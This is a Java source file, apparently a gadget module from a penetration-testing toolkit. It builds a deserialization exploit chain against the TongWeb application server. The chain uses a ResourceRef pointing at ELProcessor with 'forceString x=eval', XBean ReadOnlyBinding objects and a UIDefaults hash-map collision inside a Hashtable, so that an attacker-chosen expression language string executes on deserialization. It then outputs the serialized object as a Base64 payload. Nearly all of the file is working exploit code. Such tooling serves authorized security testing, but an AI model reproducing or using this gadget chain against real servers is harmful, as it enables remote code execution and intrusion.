package me.gv7.woodpecker.gadget;

import com.tongweb.naming.ResourceRef;
import com.tongweb.xbean.naming.context.WritableContext;
import sun.reflect.ReflectionFactory;

import javax.naming.RefAddr;
import javax.naming.StringRefAddr;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Vector;

import static me.gv7.woodpecker.util.serialize.doserialize;

public class XBeans {
    public static void setField(Object obj, String fieldName, Object value) {
        Class clazz = obj.getClass();
        while (true) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj, value);
                break;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }
    public  Object getObject(String el) throws Exception {
        System.setProperty("com.tongweb.commons.collections.enableUnsafeSerialization", "true");
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        Vector<RefAddr> evilVector = new Vector<>();
        evilVector.add(new StringRefAddr("forceString", "x=eval"));
        evilVector.add(new StringRefAddr("x", el));
        setField(resourceRef, "className", "javax.el.ELProcessor");
        setField(resourceRef, "classFactory", "com.tongweb.naming.factory.BeanFactory");
        setField(resourceRef, "addrs", evilVector);
        Constructor<?> constructor = ReflectionFactory.getReflectionFactory().
                newConstructorForSerialization(WritableContext.class, Object.class.getConstructor());

        com.tongweb.xbean.naming.context.ContextUtil.ReadOnlyBinding binding_1 = new com.tongweb.xbean.naming.context.ContextUtil.ReadOnlyBinding("foo", resourceRef, (WritableContext) constructor.newInstance());
        com.tongweb.xbean.naming.context.ContextUtil.ReadOnlyBinding binding_2 = new com.tongweb.xbean.naming.context.ContextUtil.ReadOnlyBinding("foo", resourceRef, (WritableContext) constructor.newInstance());
        Class clazz = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Constructor<?> t_constructor = clazz.getDeclaredConstructor();
        t_constructor.setAccessible(true);
        Object textAndMnemonicHashMap_1 = t_constructor.newInstance();
        Object textAndMnemonicHashMap_2 = t_constructor.newInstance();

        Method putmethod = clazz.getSuperclass().getDeclaredMethod("put", Object.class, Object.class);
        putmethod.setAccessible(true);
        putmethod.invoke(textAndMnemonicHashMap_1, binding_1, 1);
        putmethod.invoke(textAndMnemonicHashMap_2, binding_2, binding_2);

        Hashtable<Object,Object> hashtable = new Hashtable<>();
        hashtable.put(textAndMnemonicHashMap_1, 1);
        hashtable.put(textAndMnemonicHashMap_2, 1);
        putmethod.invoke(textAndMnemonicHashMap_1, binding_1, binding_1);
        return hashtable;
    }

    public  String getPayload(String type, Object obj) throws Exception {
        try {
            byte[] bytes = doserialize(type,obj);
            if(!(bytes.length ==0)){
                Base64.Encoder encoder = Base64.getEncoder();
                return encoder.encodeToString(bytes);
            }
        }catch (Exception ignored){
            return null;
        }
        return null;
    }
}
